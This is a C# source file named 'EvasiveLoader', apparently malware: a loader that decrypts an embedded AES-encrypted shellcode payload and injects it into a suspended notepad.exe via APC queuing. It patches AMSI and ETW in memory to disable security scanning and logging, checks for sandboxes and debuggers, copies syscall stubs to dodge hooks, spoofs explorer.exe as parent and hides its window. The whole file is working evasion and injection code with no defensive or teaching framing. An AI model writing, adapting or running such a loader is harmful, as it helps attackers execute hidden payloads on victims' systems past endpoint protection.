using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;



namespace EvasiveLoader
{
    class Program
    {
   
        private static readonly byte[] EncryptedPayload = new byte[512] {
                0x28, 0xA7, 0xDC, 0x64, 0x58, 0x08, 0xA8, 0x40, 0x5F, 0xD1, 0x57, 0x36, 0x6E, 0x82, 0x95, 0x2A,
                0x46, 0x7F, 0xEA, 0xBA, 0xA3, 0x0B, 0x45, 0xCA, 0x14, 0x68, 0x24, 0xC1, 0x04, 0xF7, 0x15, 0x23,
                0x15, 0xEC, 0xCC, 0xA1, 0xEA, 0xBB, 0x7A, 0x2A, 0x78, 0x8B, 0x47, 0x38, 0x50, 0x9E, 0xEA, 0xD8,
                0x79, 0xB7, 0xC5, 0x9E, 0x98, 0x8B, 0x69, 0xC2, 0x5B, 0x7E, 0xD2, 0xCD, 0xCB, 0x3A, 0x1E, 0x79,
                0xB0, 0xAA, 0x42, 0xF3, 0x50, 0x00, 0x1C, 0x11, 0x57, 0x3E, 0xB6, 0xCC, 0x44, 0x31, 0x52, 0x21,
                0xC2, 0xFE, 0x79, 0xD1, 0xD7, 0x4F, 0x68, 0x8C, 0x5D, 0x57, 0xF0, 0x73, 0x8C, 0x2D, 0x1B, 0xE3,
                0x8F, 0x39, 0x84, 0xDD, 0x89, 0x38, 0x60, 0xE1, 0x06, 0x75, 0x32, 0xBF, 0xDC, 0x53, 0x22, 0xA7,
                0x2A, 0xD3, 0xAD, 0xDF, 0x63, 0x8C, 0xB9, 0x6A, 0x6F, 0xB8, 0x3A, 0xD6, 0xCA, 0x34, 0x35, 0x14,
                0x33, 0xC0, 0x64, 0x4B, 0xD9, 0xFB, 0x76, 0x29, 0xDC, 0xC6, 0xCF, 0x63, 0x95, 0xA4, 0xD4, 0xB9,
                0x69, 0xB2, 0x3B, 0x6F, 0xE3, 0xD8, 0x03, 0xF2, 0x16, 0x5D, 0x0D, 0x98, 0xB7, 0x03, 0x47, 0x1C,
                0xCE, 0xCE, 0x45, 0x55, 0xC7, 0x26, 0x6B, 0x56, 0xE4, 0x8B, 0x8F, 0x45, 0x12, 0x40, 0x7B, 0x30,
                0x57, 0x59, 0xD9, 0xB3, 0x39, 0x30, 0xD5, 0x2E, 0xB3, 0xF1, 0x89, 0x04, 0x8E, 0x1A, 0xCC, 0xFC,
                0xF6, 0xB8, 0xFF, 0x76, 0x98, 0xF3, 0xDE, 0x8C, 0xCF, 0x38, 0xC4, 0x69, 0x9B, 0x6F, 0x4D, 0xEB,
                0xCA, 0x71, 0x9E, 0x0F, 0xA5, 0xA5, 0x41, 0x93, 0xE0, 0xC7, 0x89, 0x63, 0x87, 0x7A, 0x1C, 0x6B,
                0x9F, 0xB8, 0xE5, 0x98, 0x1C, 0xFD, 0x75, 0xD8, 0x00, 0x1C, 0x2C, 0xC7, 0x7B, 0x58, 0x86, 0xBA,
                0x1F, 0x12, 0xF8, 0xAA, 0x9E, 0xE9, 0xFA, 0xAD, 0xF2, 0xFC, 0xD0, 0x6B, 0xA5, 0x84, 0xD9, 0xB1,
                0x5F, 0x7E, 0x6D, 0x0F, 0xAD, 0x94, 0x28, 0xB6, 0x65, 0x32, 0x23, 0xFF, 0x15, 0xA9, 0xAF, 0x06,
                0xE3, 0x01, 0xBB, 0xD1, 0x5C, 0xB6, 0x54, 0xB6, 0x67, 0xFC, 0x08, 0x7D, 0xC6, 0xDC, 0x90, 0xB4,
                0xF9, 0x08, 0x8D, 0x55, 0x90, 0xD0, 0x8E, 0x76, 0x1B, 0xB4, 0x7B, 0x5E, 0xF5, 0x12, 0x65, 0x24,
                0xFC, 0xFB, 0x0A, 0xEB, 0xB4, 0x85, 0x6B, 0x85, 0xD3, 0x69, 0x15, 0xE1, 0xBC, 0x7C, 0xEE, 0x79,
                0xEE, 0xD7, 0xAF, 0xD5, 0x35, 0xF4, 0x79, 0xBF, 0xC3, 0x46, 0xFA, 0x83, 0x24, 0xE6, 0x91, 0x4C,
                0xEC, 0x3A, 0xEB, 0x08, 0x22, 0x47, 0x40, 0x34, 0x74, 0x4F, 0x25, 0x72, 0x90, 0x0B, 0xC9, 0x30,
                0x4A, 0xAE, 0x88, 0xCC, 0x35, 0xA5, 0x43, 0xEF, 0xF8, 0x59, 0x16, 0xEA, 0x89, 0x18, 0xF9, 0xFB,
                0x20, 0x47, 0xEC, 0x2F, 0x8E, 0x03, 0x0F, 0xFC, 0x67, 0x5C, 0x8C, 0x9A, 0x08, 0x2B, 0x1F, 0xE8,
                0xA7, 0x99, 0xCA, 0x24, 0x54, 0x3B, 0xF0, 0x95, 0x84, 0x38, 0x43, 0x65, 0x23, 0x25, 0xD3, 0x82,
                0xE7, 0x7B, 0xC0, 0xCE, 0x27, 0x98, 0xCF, 0x81, 0x64, 0xE5, 0xDD, 0x9B, 0xA7, 0x6A, 0x27, 0xEC,
                0xE1, 0x9A, 0x91, 0x59, 0x39, 0x30, 0x90, 0xB0, 0x3C, 0xF3, 0x1B, 0xF2, 0x17, 0xC6, 0xC2, 0x16,
                0xC9, 0x51, 0x4A, 0xC5, 0x04, 0x57, 0x49, 0xC6, 0xC7, 0xC7, 0x95, 0x4B, 0x34, 0xDD, 0x62, 0x86,
                0xB8, 0x48, 0x11, 0xC3, 0x59, 0xB3, 0xCA, 0x38, 0x22, 0x05, 0x01, 0x5E, 0xA5, 0xCC, 0x45, 0xE1,
                0xB5, 0xDC, 0x8C, 0x83, 0x45, 0xA9, 0x8E, 0x30, 0x26, 0x39, 0x1F, 0x31, 0xC8, 0x0E, 0xC5, 0x88,
                0x19, 0x62, 0x72, 0xAD, 0x23, 0x33, 0x5F, 0xB2, 0x65, 0xEE, 0x93, 0x3B, 0x46, 0x86, 0x34, 0xCD,
                0x72, 0xE1, 0xDA, 0x33, 0x56, 0x3D, 0x53, 0xCC, 0x86, 0x7E, 0xDF, 0xEF, 0xA8, 0xB2, 0x39, 0x52
        };

        private static readonly byte[] AesKey = new byte[32] {
                0xC2, 0x1A, 0x86, 0x43, 0xBB, 0xAA, 0x8A, 0xCE, 0xA3, 0x7C, 0x53, 0x18, 0x6F, 0x25, 0x12, 0x4C,
                0xE4, 0x79, 0xDB, 0xDC, 0xDC, 0x73, 0x63, 0x2E, 0x34, 0xF8, 0x96, 0x94, 0xA6, 0xFE, 0xD6, 0xC3
        };

        private static readonly byte[] AesIv = new byte[16] {
                0xBE, 0x93, 0xE3, 0x35, 0x3D, 0x57, 0x8F, 0x6B, 0x50, 0x8D, 0xC9, 0x47, 0x29, 0x03, 0x41, 0x94
        };

    
        private static byte[] AesDecrypt(byte[] ciphertext, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                ICryptoTransform decryptor = aes.CreateDecryptor();
                return decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
            }
        }


        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [Flags]
        enum ProcessAccessFlags : uint
        {
            PROCESS_CREATE_PROCESS = 0x0080,
        }

        [Flags]
        enum AllocationType : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
        }

        [Flags]
        enum MemoryProtection : uint
        {
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_SUSPENDED = 0x00000004;
        const int SW_HIDE = 0;

      
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, uint dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessW(string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    
        [DllImport("ntdll.dll")]
        static extern uint NtAllocateVirtualMemoryFallback(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll")]
        static extern uint NtWriteVirtualMemoryFallback(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, IntPtr BufferLength, out IntPtr BytesWritten);

        [DllImport("ntdll.dll")]
        static extern uint NtProtectVirtualMemoryFallback(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll")]
        static extern uint NtQueueApcThreadFallback(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        [DllImport("ntdll.dll")]
        static extern uint NtResumeThreadFallback(IntPtr ThreadHandle, out uint SuspendCount);

     
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtWriteVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, IntPtr BufferLength, out IntPtr BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtQueueApcThreadDelegate(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate uint NtResumeThreadDelegate(IntPtr ThreadHandle, out uint SuspendCount);

 
        private static IntPtr GetSyscallStub(string functionName)
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero)
                return IntPtr.Zero;

            IntPtr funcAddr = GetProcAddress(ntdll, functionName);
            if (funcAddr == IntPtr.Zero)
                return IntPtr.Zero;

            byte[] stub = new byte[24];
            Marshal.Copy(funcAddr, stub, 0, stub.Length);

            if (stub[0] != 0x4C || stub[1] != 0x8B || stub[2] != 0xD1 || stub[3] != 0xB8)
                return IntPtr.Zero;

            IntPtr stubAddr = VirtualAllocEx((IntPtr)(-1), IntPtr.Zero, (uint)stub.Length,
                AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
            if (stubAddr == IntPtr.Zero)
                return IntPtr.Zero;

            byte[] fullStub = new byte[stub.Length + 1];
            Array.Copy(stub, fullStub, stub.Length);
            fullStub[stub.Length] = 0xC3; // ret

            Marshal.Copy(fullStub, 0, stubAddr, fullStub.Length);

            uint old;
            VirtualProtect(stubAddr, (UIntPtr)fullStub.Length, (uint)MemoryProtection.PAGE_EXECUTE_READ, out old);

            return stubAddr;
        }

  
        private static void PatchAmsi()
        {
            IntPtr amsi = GetModuleHandle("amsi.dll");
            if (amsi == IntPtr.Zero)
                return;

            IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
            if (amsiScanBuffer == IntPtr.Zero)
                return;

            byte[] patch = Environment.Is64BitProcess
                ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }                
                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };    

            uint old;
            VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);
            VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, old, out _);
        }


        private static void PatchEtw()
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero)
                return;

            IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
            if (etwEventWrite == IntPtr.Zero)
                return;

            byte[] patch = Environment.Is64BitProcess
                ? new byte[] { 0xC3 }              
                : new byte[] { 0xC2, 0x14, 0x00 };  

            uint old;
            VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(patch, 0, etwEventWrite, patch.Length);
            VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, old, out _);
        }

    
        private static bool SandboxDetected()
        {
            if (IsDebuggerPresent())
                return true;

            long tickStart = Environment.TickCount;
            Sleep(2000);
            long elapsed = Environment.TickCount - tickStart;
            if (elapsed < 1500)
                return true;

            string[] artifacts = { @"C:\agent\agent.pyw", @"C:\sandbox", @"C:\cuckoo" };
            foreach (string path in artifacts)
            {
                if (System.IO.File.Exists(path) || System.IO.Directory.Exists(path))
                    return true;
            }

            return false;
        }

    
        private static void HideConsole()
        {
            IntPtr hWnd = GetConsoleWindow();
            if (hWnd != IntPtr.Zero)
                ShowWindow(hWnd, SW_HIDE);
        }

   
        static void Main(string[] args)
        {
            HideConsole();

            if (!Environment.Is64BitProcess)
                return;

            bool skipSandbox = Array.Exists(args, a => a == "--skip-sandbox" || a == "-s");
            if (!skipSandbox && SandboxDetected())
                return;

            PatchAmsi();
            PatchEtw();

            byte[] shellcode;
            try
            {
                shellcode = AesDecrypt(EncryptedPayload, AesKey, AesIv);
            }
            catch
            {
                return;
            }

            if (shellcode == null || shellcode.Length == 0)
                return;

            IntPtr stubNtAllocate = GetSyscallStub("NtAllocateVirtualMemory");
            IntPtr stubNtWrite = GetSyscallStub("NtWriteVirtualMemory");
            IntPtr stubNtProtect = GetSyscallStub("NtProtectVirtualMemory");
            IntPtr stubNtQueueApc = GetSyscallStub("NtQueueApcThread");
            IntPtr stubNtResume = GetSyscallStub("NtResumeThread");

            NtAllocateVirtualMemoryDelegate NtAllocateVirtualMemory = stubNtAllocate != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>(stubNtAllocate)
                : (NtAllocateVirtualMemoryDelegate)NtAllocateVirtualMemoryFallback;

            NtWriteVirtualMemoryDelegate NtWriteVirtualMemory = stubNtWrite != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtWriteVirtualMemoryDelegate>(stubNtWrite)
                : (NtWriteVirtualMemoryDelegate)NtWriteVirtualMemoryFallback;

            NtProtectVirtualMemoryDelegate NtProtectVirtualMemory = stubNtProtect != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtProtectVirtualMemoryDelegate>(stubNtProtect)
                : (NtProtectVirtualMemoryDelegate)NtProtectVirtualMemoryFallback;

            NtQueueApcThreadDelegate NtQueueApcThread = stubNtQueueApc != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtQueueApcThreadDelegate>(stubNtQueueApc)
                : (NtQueueApcThreadDelegate)NtQueueApcThreadFallback;

            NtResumeThreadDelegate NtResumeThread = stubNtResume != IntPtr.Zero
                ? Marshal.GetDelegateForFunctionPointer<NtResumeThreadDelegate>(stubNtResume)
                : (NtResumeThreadDelegate)NtResumeThreadFallback;

            string targetProcess = @"C:\Windows\System32\notepad.exe";

            STARTUPINFOEX siEx = new STARTUPINFOEX();
            siEx.StartupInfo.cb = (uint)Marshal.SizeOf<STARTUPINFOEX>();
            PROCESS_INFORMATION pi;

            uint creationFlags = CREATE_SUSPENDED;
            IntPtr hParent = IntPtr.Zero;
            IntPtr lpAttributeList = IntPtr.Zero;

            try
            {
                Process[] explorers = Process.GetProcessesByName("explorer");
                if (explorers.Length > 0)
                {
                    hParent = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, (uint)explorers[0].Id);
                }

                if (hParent != IntPtr.Zero)
                {
                    IntPtr lpSize = IntPtr.Zero;
                    if (!InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize))
                    {
                        hParent = IntPtr.Zero;
                    }
                    else
                    {
                        lpAttributeList = Marshal.AllocHGlobal(lpSize);
                        if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize))
                        {
                            Marshal.FreeHGlobal(lpAttributeList);
                            lpAttributeList = IntPtr.Zero;
                        }
                        else
                        {
                            IntPtr pParent = Marshal.AllocHGlobal(IntPtr.Size);
                            Marshal.WriteIntPtr(pParent, hParent);

                            bool ok = UpdateProcThreadAttribute(
                                lpAttributeList, 0,
                                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                pParent, (IntPtr)IntPtr.Size,
                                IntPtr.Zero, IntPtr.Zero);

                            Marshal.FreeHGlobal(pParent);

                            if (!ok)
                            {
                                DeleteProcThreadAttributeList(lpAttributeList);
                                Marshal.FreeHGlobal(lpAttributeList);
                                lpAttributeList = IntPtr.Zero;
                            }
                        }
                    }
                }
            }
            catch
            {
                if (lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(lpAttributeList);
                    Marshal.FreeHGlobal(lpAttributeList);
                    lpAttributeList = IntPtr.Zero;
                }
                if (hParent != IntPtr.Zero)
                {
                    CloseHandle(hParent);
                    hParent = IntPtr.Zero;
                }
            }

            if (lpAttributeList != IntPtr.Zero)
            {
                siEx.lpAttributeList = lpAttributeList;
                creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
            }

            StringBuilder cmdline = new StringBuilder(targetProcess);
            bool created = CreateProcessW(null, cmdline, IntPtr.Zero, IntPtr.Zero, false,
                creationFlags, IntPtr.Zero, null, ref siEx, out pi);

            if (lpAttributeList != IntPtr.Zero)
            {
                DeleteProcThreadAttributeList(lpAttributeList);
                Marshal.FreeHGlobal(lpAttributeList);
            }
            if (hParent != IntPtr.Zero)
            {
                CloseHandle(hParent);
            }

            if (!created)
                return;

            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            uint status = NtAllocateVirtualMemory(pi.hProcess, ref baseAddr, IntPtr.Zero, ref regionSize,
                (uint)(AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE), (uint)MemoryProtection.PAGE_READWRITE);
            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            IntPtr shellcodePtr = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, shellcodePtr, shellcode.Length);

            IntPtr bytesWritten;
            status = NtWriteVirtualMemory(pi.hProcess, baseAddr, shellcodePtr, (IntPtr)shellcode.Length, out bytesWritten);

            Marshal.FreeHGlobal(shellcodePtr);

            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            IntPtr protectAddr = baseAddr;
            IntPtr protectSize = (IntPtr)shellcode.Length;
            uint oldProtect;
            status = NtProtectVirtualMemory(pi.hProcess, ref protectAddr, ref protectSize,
                (uint)MemoryProtection.PAGE_EXECUTE_READ, out oldProtect);
            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            status = NtQueueApcThread(pi.hThread, baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            uint suspendCount;
            status = NtResumeThread(pi.hThread, out suspendCount);
            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Sleep(1000);
        }
    }
}
